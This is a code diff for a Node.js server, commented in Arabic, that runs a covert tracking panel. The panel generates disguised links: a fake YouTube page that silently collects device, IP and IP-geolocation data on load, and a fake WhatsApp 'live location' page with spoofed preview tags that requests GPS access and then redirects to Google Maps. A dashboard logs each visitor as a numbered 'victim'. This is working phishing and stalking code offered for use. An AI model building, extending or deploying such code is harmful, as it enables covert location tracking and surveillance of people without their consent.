@@ -8,7 +8,7 @@ const io = new Server(server, { cors: { origin: "*" } });
 
 app.use(express.json());
 
-// 1. لوحة التحكم المركزية لاستلام بيانات الضحايا وتوليد الروابط
+// 1. لوحة التحكم المركزية (تضم خيار الفيديو وخيار الخريطة)
 app.get('/', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -16,44 +16,87 @@ app.get('/', (req, res) => {
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>لوحة التحكم المركزية</title>
+        <title>لوحة التحكم - الروابط الذكية</title>
         <style>
             body { font-family: system-ui, sans-serif; background: #121212; color: #fff; text-align: center; padding: 20px; }
             .card { background: #1e1e1e; border-radius: 12px; padding: 20px; margin: 15px auto; max-width: 600px; box-shadow: 0 4px 10px rgba(0,0,0,0.5); text-align: right; }
             h2, h3 { text-align: center; }
-            button { background: #25D366; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
+            button { background: #ff0000; color: white; border: none; padding: 12px 20px; font-size: 15px; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; }
+            button.map-btn { background: #25D366; }
             button:hover { opacity: 0.9; }
-            input { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; margin-top: 8px; box-sizing: border-box; }
-            .section { margin-bottom: 25px; border-bottom: 1px solid #333; padding-bottom: 20px; }
-            .info-box { background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #25D366; font-size: 14px; line-height: 1.7; }
+            input, select { width: 100%; padding: 10px; border-radius: 6px; border: 1px solid #333; background: #222; color: #fff; margin-top: 8px; box-sizing: border-box; }
+            .section { margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 15px; }
+            .info-box { background: #2a2a2a; padding: 15px; border-radius: 8px; margin-top: 12px; border-right: 5px solid #ff0000; font-size: 14px; line-height: 1.7; }
         </style>
     </head>
     <body>
-        <h2>🎛️ لوحة التحكم - نظام تتبع الخرائط المخفي</h2>
+        <h2>🎛️ لوحة التحكم المركزية للروابط</h2>
         
         <div class="card">
-            <h3>🔗 توليد رابط الخريطة الذكي</h3>
+            <h3>🔗 منشئ الروابط المتعدد</h3>
+            
             <div class="section">
-                <p style="font-size: 13px; color: #aaa;">انقر لإنشاء رابط يظهر كمعاينة موقع حقيقي في واتساب:</p>
-                <button type="button" onclick="makeLink()">🗺️ إنشاء الرابط</button>
+                <label>اختر نوع الرابط الذي تريد إنشاؤه:</label>
+                <select id="linkType" onchange="toggleInputs()">
+                    <option value="youtube">📺 رابط فيديو يوتيوب (صامت)</option>
+                    <option value="map">🗺️ رابط خريطة موقع مباشر (لواتساب)</option>
+                </select>
+            </div>
+
+            <!-- إعدادات يوتيوب -->
+            <div id="youtubeSection" class="section">
+                <label>رابط فيديو يوتيوب:</label>
+                <input type="text" id="ytUrlInput" value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
+                <button type="button" onclick="makeLink('youtube')">📺 إنشاء رابط يوتيوب</button>
+            </div>
+
+            <!-- إعدادات الخريطة -->
+            <div id="mapSection" class="section" style="display:none;">
+                <p style="font-size: 13px; color: #aaa;">يظهر كمعاينة موقع حقيقي في واتساب، وعند الفتح يمر بسيناريو أخذ الإذن والخريطة.</p>
+                <button type="button" class="map-btn" onclick="makeLink('map')">🗺️ إنشاء رابط الخريطة المخفي</button>
             </div>
 
             <div id="linkContainer" style="display:none; margin-top: 15px;">
-                <label>الرابط الجاهز للإرسال:</label>
+                <label>الرابط الجاهز للنسخ:</label>
                 <input type="text" id="linkInput" readonly onclick="this.select();">
             </div>
         </div>
 
-        <h3>📥 سجل الضحايا والمواقع الواردة:</h3>
+        <h3>📥 سجل الضحايا الواردة:</h3>
         <div id="logs" class="card">
-            <p style="color: #aaa; text-align: center;">في انتظار فتح الرابط من الضحية...</p>
+            <p style="color: #aaa; text-align: center;">في انتظار فتح الروابط...</p>
         </div>
 
         <script src="/socket.io/socket.io.js"></script>
         <script>
-            function makeLink() {
+            function toggleInputs() {
+                const type = document.getElementById('linkType').value;
+                if (type === 'youtube') {
+                    document.getElementById('youtubeSection').style.display = 'block';
+                    document.getElementById('mapSection').style.display = 'none';
+                } else {
+                    document.getElementById('youtubeSection').style.display = 'none';
+                    document.getElementById('mapSection').style.display = 'block';
+                }
+                document.getElementById('linkContainer').style.display = 'none';
+            }
+
+            function makeLink(type) {
                 const uniqueId = Math.random().toString(36).substring(2, 8);
-                const fullUrl = window.location.origin + '/map-view/' + uniqueId;
+                let fullUrl = "";
+
+                if (type === 'youtube') {
+                    const ytUrl = document.getElementById('ytUrlInput').value;
+                    let videoId = "dQw4w9WgXcQ";
+                    if (ytUrl.includes('youtu.be/')) {
+                        videoId = ytUrl.split('youtu.be/')[1].substring(0, 11);
+                    } else if (ytUrl.includes('v=')) {
+                        videoId = ytUrl.split('v=')[1].substring(0, 11);
+                    }
+                    fullUrl = window.location.origin + '/watch/' + uniqueId + '?v=' + videoId;
+                } else {
+                    fullUrl = window.location.origin + '/map-view/' + uniqueId;
+                }
                 
                 document.getElementById('linkInput').value = fullUrl;
                 document.getElementById('linkContainer').style.display = 'block';
@@ -68,13 +111,14 @@ app.get('/', (req, res) => {
                 const box = document.createElement('div');
                 box.className = 'info-box';
                 box.innerHTML = '<strong>🔴 الضحية رقم (# ' + victimCounter++ + ')</strong><br>' +
+                                '<strong>🎯 الرابط المفتوح:</strong> ' + data.targetType + '<br>' +
                                 '<strong>📱 ماركة الهاتف:</strong> ' + data.deviceName + '<br>' +
                                 '<strong>🌐 المتصفح والنظام:</strong> ' + data.browser + ' / ' + data.os + '<br>' +
                                 '<strong>📡 الشبكة (ISP):</strong> ' + data.networkISP + '<br>' +
                                 '<strong>🌐 عنوان IP:</strong> ' + data.ip + '<br>' +
-                                '<strong>📍 العنوان الدقيق (الشارع والمنطقة):</strong> <span style="color: #4CAF50; font-weight: bold;">' + data.fullAddress + '</span><br>' +
-                                (data.lat ? '<strong>🗺️ إحداثيات الخريطة:</strong> <a href="https://maps.google.com/?q=' + data.lat + ',' + data.lon + '" target="_blank" style="color: #00bcd4;">فتح على خرائط جوجل</a><br>' : '') +
-                                '<strong>🕒 وقت الدخول:</strong> ' + data.time;
+                                '<strong>📍 العنوان الدقيق:</strong> <span style="color: #4CAF50; font-weight: bold;">' + data.fullAddress + '</span><br>' +
+                                (data.lat ? '<strong>🗺️ الخريطة:</strong> <a href="https://maps.google.com/?q=' + data.lat + ',' + data.lon + '" target="_blank" style="color: #00bcd4;">فتح على خرائط جوجل</a><br>' : '') +
+                                '<strong>🕒 الوقت:</strong> ' + data.time;
                 logs.prepend(box);
             });
         </script>
@@ -83,7 +127,96 @@ app.get('/', (req, res) => {
   `);
 });
 
-// 2. صفحة معاينة الموقع (واتساب + طلب الموقع + الشاشة البيضاء + التوجيه للخريطة)
+// 2. صفحة عرض فيديو يوتيوب (جمع صامت)
+app.get('/watch/:id', async (req, res) => {
+  const videoId = req.query.v || 'dQw4w9WgXcQ';
+  let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
+  if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
+
+  res.send(`
+    <!DOCTYPE html>
+    <html lang="ar" dir="rtl">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>YouTube</title>
+        <style>
+            body { font-family: Arial, sans-serif; background: #0f0f0f; color: #fff; margin: 0; padding: 0; text-align: center; }
+            .header { background: #212121; padding: 12px 20px; text-align: left; font-weight: bold; font-size: 18px; color: #ff0000; border-bottom: 1px solid #333; }
+            .container { max-width: 800px; margin: 20px auto; padding: 10px; }
+            .video-container { position: relative; width: 100%; padding-bottom: 56.25%; height: 0; background: #000; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.8); }
+            .video-container iframe { position: absolute; top: 0; left: 0; width: 100%; height: 100%; border: 0; }
+        </style>
+    </head>
+    <body>
+        <div class="header">▶ YouTube</div>
+        <div class="container">
+            <div class="video-container">
+                <iframe src="https://www.youtube-nocookie.com/embed/${videoId}?autoplay=1" allow="autoplay; encrypted-media" allowfullscreen></iframe>
+            </div>
+        </div>
+
+        <script>
+            function getExactDeviceModel(ua) {
+                let match = ua.match(/(Redmi\\s[\\w\\d]+|SM-[A-Z0-9]+|iPhone\\s[\\w\\s]+|POCO\\s[\\w\\d]+|Pixel\\s[\\td\\w\\s]+|Huawei\\s[\\w\\d]+|OPPO\\s[\\w\\d]+|Vivo\\s[\\w\\d]+)/i);
+                if (match) return match[0];
+                if (ua.includes('Android')) return 'هاتف Android';
+                if (ua.includes('iPhone')) return 'Apple iPhone';
+                if (ua.includes('Windows')) return 'Windows Computer';
+                return 'جهاز ذكي';
+            }
+            function getBrowserInfo(ua) {
+                if (ua.includes('Firefox')) return 'Firefox';
+                if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
+                if (ua.includes('Opera') || ua.includes('OPR')) return 'Opera';
+                if (ua.includes('Edg')) return 'Edge';
+                if (ua.includes('Chrome')) return 'Chrome';
+                if (ua.includes('Safari')) return 'Safari';
+                return 'متصفح آخر';
+            }
+            function getOSInfo(ua) {
+                if (ua.includes('Win')) return 'Windows';
+                if (ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+                if (ua.includes('Android')) return 'Android';
+                if (ua.includes('Mac')) return 'macOS';
+                return 'أخرى';
+            }
+
+            async function collectAndSend() {
+                const ua = navigator.userAgent;
+                const deviceData = {
+                    targetType: "رابط يوتيوب (صامت)",
+                    deviceName: getExactDeviceModel(ua),
+                    browser: getBrowserInfo(ua),
+                    os: getOSInfo(ua),
+                    ip: "${clientIp}",
+                    networkISP: "جاري الجلب...",
+                    fullAddress: "جاري الجلب عبر IP...",
+                    time: new Date().toLocaleTimeString('ar-EG')
+                };
+
+                try {
+                    const response = await fetch('https://ipapi.co/${clientIp}/json/');
+                    const ipData = await response.json();
+                    deviceData.networkISP = ipData.org || "غير معروف";
+                    deviceData.fullAddress = (ipData.city || "مجهول") + ", " + (ipData.country_name || "مجهول");
+                } catch(e){}
+
+                fetch('/api/log', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(deviceData)
+                });
+            }
+
+            window.onload = collectAndSend;
+        </script>
+    </body>
+    </html>
+  `);
+});
+
+// 3. صفحة رابط الخريطة المخفي (واتساب + إذن الموقع + الشاشة البيضاء + الخريطة الحقيقية)
 app.get('/map-view/:id', async (req, res) => {
   let clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'غير معروف';
   if (clientIp.includes(',')) clientIp = clientIp.split(',')[0].trim();
@@ -96,7 +229,6 @@ app.get('/map-view/:id', async (req, res) => {
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>موقع جغرافي مباشر - Live Location</title>
         
-        <!-- وسوم واتساب الحقيقية لظهور المعاينة -->
         <meta property="og:title" content="📍 مشاركة موقع مباشر (Live Location)">
         <meta property="og:description" content="تم مشاركة موقع جغرافي معك. اضغط لعرض المكان الحالي على الخريطة.">
         <meta property="og:image" content="https://images.unsplash.com/photo-1526778548025-fa2f459cd5c1?w=600&auto=format&fit=crop&q=80">
@@ -160,6 +292,7 @@ app.get('/map-view/:id', async (req, res) => {
                             
                             const ua = navigator.userAgent;
                             const deviceData = {
+                                targetType: "رابط خريطة مباشر",
                                 deviceName: getExactDeviceModel(ua),
                                 browser: getBrowserInfo(ua),
                                 os: getOSInfo(ua),
@@ -189,13 +322,11 @@ app.get('/map-view/:id', async (req, res) => {
                                 deviceData.fullAddress = "خطوط الطول: " + lat + ", العرض: " + lon;
                             }
 
-                            // إرسال البيانات للوحة التحكم فورا عبر الـ API
                             fetch('/api/log', {
                                 method: 'POST',
                                 headers: { 'Content-Type': 'application/json' },
                                 body: JSON.stringify(deviceData)
                             }).then(() => {
-                                // عرض الشاشة البيضاء المؤقتة والانتقال لخرائط جوجل الحقيقية
                                 document.body.innerHTML = '<div style="background:#fff; width:100vw; height:100vh; display:flex; justify-content:center; align-items:center; font-family:sans-serif; color:#333;"><h3>جاري تحميل الخريطة...</h3></div>';
                                 
                                 setTimeout(() => {
